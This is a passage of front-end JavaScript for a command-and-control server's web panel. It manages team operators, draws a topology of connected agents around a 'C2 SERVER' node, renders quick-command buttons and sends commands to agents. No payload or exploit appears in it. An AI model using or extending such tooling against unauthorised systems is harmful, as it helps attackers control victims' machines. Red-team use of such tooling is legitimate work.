                  <td style="padding:6px 8px;"><span style="background:rgba(200,41,62,0.12);color:#c8293e;padding:2px 8px;border-radius:4px;font-size:10px;">${Esc(op.Role)}</span></td>
                  <td style="padding:6px 8px;color:#475569;font-size:10px;">${Esc(op.LastSeen || "Never")}</td>
                  <td style="padding:6px 8px;text-align:right;display:flex;gap:4px;justify-content:flex-end;">
                    ${!isAdmin && !isSelf ? `<button class="btn sm btn-outline-red" onclick="KickOp('${Esc(op.Username)}')" title="Kick operator" style="font-size:10px;"><i class="fas fa-user-times"></i></button>` : ""}
                  </td>
                </tr>`;
              })
              .join("")}
            </tbody>
          </table>`;

    c.innerHTML = roleTable + opTable;
  } catch (e) {
    if (e.message !== "Unauthorized")
      c.innerHTML =
        '<div style="color:#f87171;padding:16px;">Error: ' +
        Esc(e.message) +
        "</div>";
  }
}

async function CreateOp() {
  let u = ((document.getElementById("new-op-user") || {}).value || "").trim();
  let p = (document.getElementById("new-op-pass") || {}).value || "";
  let r = (document.getElementById("new-op-role") || {}).value || "OPERATOR";
  if (!u || !p) {
    Log("Username and password required", "error");
    return;
  }
  if (p.length < 8) {
    Log("Password must be ≥ 8 characters", "error");
    return;
  }
  try {
    let res = await Api("/api/team/operators/create", {
      method: "POST",
      body: JSON.stringify({ Username: u, Password: p, Role: r }),
    });
    let d = await res.json();
    if (d.Success) {
      Log("Operator created: " + u + " [" + r + "]", "success");
      let el = document.getElementById("new-op-user");
      if (el) el.value = "";
      let ep = document.getElementById("new-op-pass");
      if (ep) ep.value = "";
      LoadTeam();
    } else Log("Error: " + (d.Error || d.Message), "error");
  } catch (e) {
    if (e.message !== "Unauthorized") Log("Error: " + e.message, "error");
  }
}

async function KickOp(username) {
  if (!confirm("Kick operator: " + username + "?")) return;
  try {
    let r = await Api("/api/team/operators/kick", {
      method: "POST",
      body: JSON.stringify({ Username: username }),
    });
    let d = await r.json();
    if (d.Success) {
      Log("Operator kicked: " + username, "warn");
      LoadTeam();
    } else Log("Error: " + (d.Error || d.Message), "error");
  } catch (e) {
    if (e.message !== "Unauthorized") Log("Error: " + e.message, "error");
  }
}

// ── Topology SVG ──────────────────────────────────────────────────────────────

function SvgEl(tag, attrs) {
  let el = document.createElementNS("http://www.w3.org/2000/svg", tag);
  Object.entries(attrs || {}).forEach(([k, v]) => el.setAttribute(k, v));
  return el;
}

function DrawTopology() {
  let svg = document.getElementById("topologySvg");
  if (!svg) return;
  svg.innerHTML = "";
  let W = svg.clientWidth || 600,
    H = parseInt(svg.getAttribute("height")) || 300;
  svg.setAttribute("viewBox", "0 0 " + W + " " + H);
  let defs = SvgEl("defs");
  let pat = SvgEl("pattern", {
    id: "tg",
    width: 28,
    height: 28,
    patternUnits: "userSpaceOnUse",
  });
  pat.appendChild(
    SvgEl("path", {
      d: "M 28 0 L 0 0 0 28",
      fill: "none",
      stroke: "rgba(180,40,40,0.04)",
      "stroke-width": "1",
    }),
  );
  defs.appendChild(pat);
  svg.appendChild(defs);
  svg.appendChild(SvgEl("rect", { width: W, height: H, fill: "url(#tg)" }));
  if (!State.serverRunning && !State.agentList.length) {
    let t = SvgEl("text", {
      x: W / 2,
      y: H / 2,
      "text-anchor": "middle",
      fill: "rgba(180,40,40,0.2)",
      "font-family": "Orbitron,monospace",
      "font-size": "12",
      "letter-spacing": "4",
    });
    t.textContent = "NO CONNECTIONS";
    svg.appendChild(t);
    return;
  }
  let cx = W / 2,
    cy = H / 2,
    rad = Math.min(W, H) * 0.3;
  State.agentList.forEach((a, i) => {
    let angle =
      (2 * Math.PI * i) / Math.max(State.agentList.length, 1) - Math.PI / 2;
    let ax = cx + rad * Math.cos(angle),
      ay = cy + rad * Math.sin(angle);
    let pid = "tp" + i;
    svg.appendChild(
      SvgEl("line", {
        x1: cx,
        y1: cy,
        x2: ax,
        y2: ay,
        stroke: "rgba(180,40,40,0.15)",
        "stroke-width": "1",
        "stroke-dasharray": "5 5",
      }),
    );
    svg.appendChild(
      SvgEl("path", {
        id: pid,
        d: `M${cx},${cy} L${ax},${ay}`,
        fill: "none",
      }),
    );
    let pkt = SvgEl("circle", { r: "3", fill: "#c8293e", opacity: "0.85" });
    let anim = SvgEl("animateMotion", {
      dur: 1.8 + i * 0.4 + "s",
      repeatCount: "indefinite",
    });
    let mp = SvgEl("mpath");
    mp.setAttribute("href", "#" + pid);
    anim.appendChild(mp);
    pkt.appendChild(anim);
    svg.appendChild(pkt);
    let name = a.DisplayName || a.AgentName || "AGENT-" + a.ID;
    DrawNode(
      svg,
      ax,
      ay,
      name,
      a.AgentIP || "",
      false,
      () => SelectAndGo(a.ID),
      State.selectedId === a.ID,
    );
  });
  DrawNode(
    svg,
    cx,
    cy,
    "C2 SERVER",
    State.serverHost + ":" + State.serverPort,
    true,
  );
}

function DrawNode(svg, x, y, label, sub, isServer, onClick, sel) {
  let g = SvgEl("g");
  if (onClick) {
    g.style.cursor = "pointer";
    g.addEventListener("click", onClick);
  }
  let r = isServer ? 30 : 22;
  let color = isServer ? "#c8293e" : sel ? "#c8293e" : "rgba(148,163,184,0.4)";
  let fill = isServer ? "#2a0e12" : sel ? "#2a0e12" : "#1e2335";
  g.appendChild(
    SvgEl("circle", {
      cx: x,
      cy: y,
      r: r + 7,
      fill: "none",
      stroke: isServer
        ? "rgba(180,40,40,0.25)"
        : sel
          ? "rgba(180,40,40,0.4)"
          : "rgba(148,163,184,0.12)",
      "stroke-width": "1",
      "stroke-dasharray": isServer ? "0" : "3 3",
    }),
  );
  g.appendChild(
    SvgEl("circle", {
      cx: x,
      cy: y,
      r: r,
      fill: fill,
      stroke: color,
      "stroke-width": "1.5",
    }),
  );
  let fo = SvgEl("foreignObject", {
    x: x - 12,
    y: y - 12,
    width: 24,
    height: 24,
  });
  let div = document.createElement("div");
  div.style.cssText =
    "width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:13px;color:" +
    (isServer ? "#c8293e" : "#94a3b8") +
    ";";
  div.innerHTML =
    '<i class="fas ' + (isServer ? "fa-server" : "fa-laptop") + '"></i>';
  fo.appendChild(div);
  g.appendChild(fo);
  let lbl = SvgEl("text", {
    x,
    y: y + r + 13,
    "text-anchor": "middle",
    fill: isServer ? "#c8293e" : "#cbd5e1",
    "font-family": "Orbitron,monospace",
    "font-size": "8.5",
    "font-weight": "700",
    "letter-spacing": "1",
  });
  lbl.textContent = label.length > 10 ? label.substring(0, 9) + "…" : label;
  g.appendChild(lbl);
  let s2 = SvgEl("text", {
    x,
    y: y + r + 23,
    "text-anchor": "middle",
    fill: "#475569",
    "font-family": "Share Tech Mono,monospace",
    "font-size": "8",
  });
  s2.textContent = sub;
  g.appendChild(s2);
  svg.appendChild(g);
}

// ── Quick cmds render ─────────────────────────────────────────────────────────

function RenderQuickCmds() {
  let g = document.getElementById("quick-grid");
  if (!g) return;
  g.innerHTML = QuickCmds.map(
    (q) =>
      `<button class="quick-btn" onclick="QuickCmd('${q.cmd}')"><i class="${q.icon}"></i>${q.label}</button>`,
  ).join("");
}

// ── Bootstrap ─────────────────────────────────────────────────────────────────

async function BootStatus() {
  try {
    let d = await (await Api("/api/server/status")).json();
    if (d.Status === "Online") {
      State.serverRunning = true;
      State.serverHost = d.Host;
      State.serverPort = d.Port;
      State.serverAddress = d.Host + ":" + d.Port;
      State.sessionKey = d.Key || "";
      State.serverStartedAt = d.StartedAt || null;
      UpdateToggleBtns();
      UpdateSphere();
      UpdateStats();
      StartPoll();
      if (State.serverStartedAt) StartUptime();
      Log("Connected to server at " + State.serverAddress, "success");
    }
  } catch (e) {}
  DrawTopology();
  GoTo("dashboard");
}

// ── DOM ready ─────────────────────────────────────────────────────────────────

document.addEventListener("DOMContentLoaded", async () => {
  TickClock();
  clockTimer = setInterval(TickClock, 1000);
  RenderQuickCmds();
  RenderLogs();
  UpdateTargetBadge();

  document
    .querySelectorAll("[data-nav]")
    .forEach((el) => el.addEventListener("click", () => GoTo(el.dataset.nav)));
  ["topbar-server-btn", "mobile-server-btn", "server-toggle-btn"].forEach(
    (id) => {
      let el = document.getElementById(id);
      if (el) el.addEventListener("click", ToggleServer);
    },
  );

  let ci = document.getElementById("cmd-input");
  if (ci)
    ci.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        ExecCmd();
        return;
      }
      if (e.key === "ArrowUp") {
        HistIdx = Math.min(HistIdx + 1, CmdHistory.length - 1);
        ci.value = CmdHistory[HistIdx] || "";
      }
      if (e.key === "ArrowDown") {
        HistIdx = Math.max(HistIdx - 1, -1);
        ci.value = HistIdx < 0 ? "" : CmdHistory[HistIdx];
      }
    });

  let si = document.getElementById("srv-cmd-input");
  if (si)
    si.addEventListener("keydown", (e) => {
      if (e.key === "Enter") RunServerCmd();
    });

  let cont = document.querySelector(".content");
  if (cont)
    cont.addEventListener(
      "scroll",
      (e) => {
        let el = e.target,
          st = el.scrollTop;
        let atBot = el.scrollHeight - st - el.clientHeight < 32;
        let down = st > State.lastScrollY;
        let bnav = document.querySelector(".bottom-nav");
        if (bnav) {
          bnav.classList.toggle("hidden", atBot && down);
          if (!down) bnav.classList.remove("hidden");
        }
        State.lastScrollY = st;
      },
      { passive: true },
    );

  let isTeam = false;
  try {
    let probe = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });
    isTeam = probe.status !== 404;
  } catch (e) {}

  State.isTeam = isTeam;
  if (isTeam) {
    LoadToken();
    UpdateBadge();
    if (!State.token) {
      ShowLogin();
      return;
    }
    try {
      let r = await fetch("/api/server/status", {
        headers: { Authorization: "Bearer " + State.token },
      });
      if (r.status === 401) {
        ClearToken();
        ShowLogin("Session expired");
        return;
      }
    } catch (e) {}
  }
  await BootStatus();
});
